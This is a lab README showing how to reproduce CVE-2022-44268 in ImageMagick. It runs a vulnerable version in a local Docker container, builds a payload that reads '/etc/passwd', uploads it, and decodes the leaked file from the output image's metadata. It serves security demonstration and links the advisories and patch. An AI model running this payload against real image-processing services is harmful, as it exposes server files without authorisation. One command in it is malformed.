## How to use

### 1. Clone the project 
`git clone git@github.com:AltSolution/CVE.git`

### 2. Build docker image with vulnerable version of ImageMagic (7.1.0-33 in our example)
```
cd CVE/CVE-2022-44268/
docker build -t cve-2022-44268 .
docker run -p 80:80 -d cve-2022-44268
```


### 3. Generate payload 

```
mkdir ~/cve-payload
cd mkdir ~/cve-payload
git clone https://github.com/voidz0r/CVE-2022-44268.git
apt install cargo
cargo run "/etc/passwd"
```


### 3. Make exploitation

1. Upload payload to http://127.0.0.1

2. Download result image to local folder

3. Extract useful metadata

`identify -verbose output.png`

4. Copy output of profile field to https://gchq.github.io/CyberChef/

5. Use "FromHex" and get result and get clear data.

### Links
1. [ImageMagic official site](https://imagemagick.org/index.php)
2. [Original report](https://www.metabaseq.com/imagemagick-zero-days/)
3. [Exploit DB](https://www.exploit-db.com/exploits/51261)
4. [Exploit for CVE-2022-44268 at GitHub](https://github.com/voidz0r/CVE-2022-44268)
5. [CVE Details about CVE-2022-44268](https://www.cvedetails.com/cve/CVE-2022-44268/)
6. [Snyc about CVE-2022-44268](https://security.snyk.io/vuln/SNYK-COCOAPODS-IMAGEMAGICK-3313085)
7. [Official patch of CVE-2022-44268](https://github.com/ImageMagick/ImageMagick6/commit/3c5188b41902a909e163492fb0c)

